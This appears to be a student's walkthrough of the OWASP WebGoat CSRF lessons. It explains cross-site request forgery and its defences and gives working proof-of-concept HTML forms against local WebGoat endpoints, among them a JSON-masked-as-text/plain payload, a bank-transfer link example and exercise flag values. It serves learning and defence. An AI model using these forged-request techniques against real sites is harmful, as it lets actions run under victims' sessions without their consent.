# Cross-Site Request Forgery (CSRF)
- type of malicious exploit of a website
- unauthorized commands are transmitted from a user that the website `trusts`
- differ from XSS which exploits the `trust` a `user` has in a website.
- CSRF exploits the trust that a site has in the `user's browser`.

## Common Characteristics
- involves sites that rely on a user's identity
- exploits the site's trust in that identity
- tricks the user's browser into sending HTTP requests to a target site
- involves HTTP requests that have side effects

## Who is at risk?
- web applications that perform actions based on input from trusted and authenticated users
- without requiring the user to authorize the specific action
- a user who is authenticated via a cookie saved in the user's browser
- could unknowingly send a HTTP request to a site that trusts the user and thereby causes an unwanted action

## CSRF's targets
- abuses basic web functionalities
- attacks target state-changing requests

## CSRF with GET Request
```
<a href="http://bank.com/transfer?account_number_from=123456789&account_number_to=987654321&amount=100000">View my Pictures!</a>
```
If user is still logged into the website of bank.com, this GET request will transfer money from one account to another.

## Exercise 1
![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/18%20CSRF%20exercise%201.PNG?token=ANjmppupghhlEGRg8xfMWV1ayBLSIDRmks5bzIcJwA%3D%3D)

Click on the `Submit` button.

![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/19%20CSRF%20click%20on%20submit%20button.PNG?token=ANjmpnIzAi2k9Xe9YyeYbLt4Q5G0nuW5ks5bzIdQwA%3D%3D)

Note the URL:
```
http://localhost:8080/WebGoat/csrf/basic-get-flag?csrf=false&submit=Submit
```

Change it to:
```
http://localhost:8080/WebGoat/csrf/basic-get-flag?csrf=true&submit=Submit
```
Can see that the server does not expect the user to change the value in the URL.
[trust in user's browser exploited]

![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/20%20CSRF%20exercise%201%20completed.PNG?token=ANjmpt1L6Px7ihYS91cQhHtvqkVdBcDXks5bzIeiwA%3D%3D)

Input the value of flag to confirm it's value.

### Alternative Way
Craft your own html page to make the external request:
```html
<html>
	<body>
		<form action ="http://localhost:8080/WebGoat/csrf/basic-get-flag">
			<input type="hidden" name="csrf" value="false" />
			<input type="hidden" name="submit" value="Submit&#32;Query" />
			<input type="submit" value="Submit" />
		</form>
	</body>
</html>
```
Open this file in the browser, and click the submit button.
You will get the same results as above.

## Exercise 2
Goal: to trigger a review submission on behalf of the currently logged in user.

Use burp to intercept the request and note the fields in the request.

![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/21%20CSRF%202%20note%20the%20fields%20in%20the%20request.PNG?token=ANjmpr88_Sk--i7aApfotD0Yleo0z8Qzks5bzJ59wA%3D%3D)

Craft the external html request:
```html
<html>
	<body>
		<form action ="http://localhost:8080/WebGoat/csrf/review" method=post enctype="application/x-www-form-urlencoded; charset=UTF-8">
			<input type="hidden" name="reviewText" value='anything' />
			<input type="hidden" name="stars" value="5" />
			<input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9" />
			<input type="submit" value="Submit" />
		</form>
	</body>
</html>
```

Open this file in the web browser and click on the submit button.
```
{
  "lessonCompleted" : true,
  "feedback" : "It appears you have submitted correctly from another site. Go reload and see if your post is there.",
  "output" : null
}
```
![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/23%20CSRF%202%20done.PNG?token=ANjmpg0qgIw4JZd0RZhWR75m8k6EvZrvks5bzJ6VwA%3D%3D)

## Automatic Support from Frameworks
- most frameworks now have default support for preventing CSRF.
- only code on your domain could read the cookie.
- therefore backend can be certain that the HTTP request comes from client application and not the attacker.
- in order for this to work, the backend server sets the token in a cookie.
- cookie should not be marked with the http-only flag.
- on every request, browser put token in the X-XSRF-TOKEN as a HTTP header.
- server can validate whether these two tokens match
- ensure the server and the request is running in the same domain.
```
Important!
Define a separate cookie
Do not reuse the session cookie
Session cookie should always be defined with http-only flag
```

### Custom Headers are not Safe
- another defense can be to add a custom request header.
- will work if all the interactions with the server are performed with JavaScript.
- on server side, only need to check the presence of this header
- if header is not present: deny request
- however, this method can by bypassed too

```
Should always implement a CSRF protection instead of relying on the content-type of APIs.
```

## Exercise 3
Need to avoid preflighted request! Instead, use simple request. Meaning that content type can only be:
```
application/x-www-form-urlencoded
multipart/form-data
text/plain
```

Capture the request based on parameters in request:

![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/24%20CSRF%203%20captured%20request.PNG?token=ANjmprZtH4JBeGm-yG8-octZ3JuJhx58ks5bzKkzwA%3D%3D)

Craft external request:
```html
<html>
	<title>JSON CSRF POC</title>
	<h1>JSON CSRF POC</h1>
	<body>
		<form action =http://localhost:8080/WebGoat/csrf/feedback/message method=post enctype="text/plain">
			<!-- mask json data as plain text -->
			<input type="hidden" name='{"name":"WebGoat","email":"webgoat@webgoat.org","content":"Webgoat is the best!!","ignore_me":"' value='test"}' />
			<!-- confuse browser that {"name":"WebGoat","email":"webgoat@webgoat.org","content":"Webgoat is the best!!","ignore_me":" is the name of the parameter -->
			<input type="submit" value="Submit" />
		</form>
	</body>
</html>
```

Open file in browser and press the submit button.
```
{
  "lessonCompleted" : true,
  "feedback" : "Congratulations you have found the correct solution, the flag is: c450897e-e0a2-4b14-87d9-127a626cfa56",
  "output" : null
}
```

Lesson completed.

## Exercise 4
Register a new user in another tab:

![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/25%20CSRF%204%20create%20a%20new%20user.PNG?token=ANjmpl9F-g9FhvcdZWdU2tYsT2aNAud4ks5bzKwowA%3D%3D)

Note: it doesn't have to be captured by burp.

Login as the new user:

![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/26%20CSRF%204%20login%20as%20new%20user.PNG?token=ANjmpoDaMHJflu_hKIZ82W4BMIHDqgL9ks5bzKxZwA%3D%3D)

Click on button in original tab:

![alt-text](https://raw.githubusercontent.com/brendaang/OWASP-WebGoat-Exercises/master/Images/27%20CSRF%204%20click%20on%20button.PNG?token=ANjmphLS8_V0P5VDrCYrL8Eg3dmDxeimks5bzKyLwA%3D%3D)

Lesson completed.
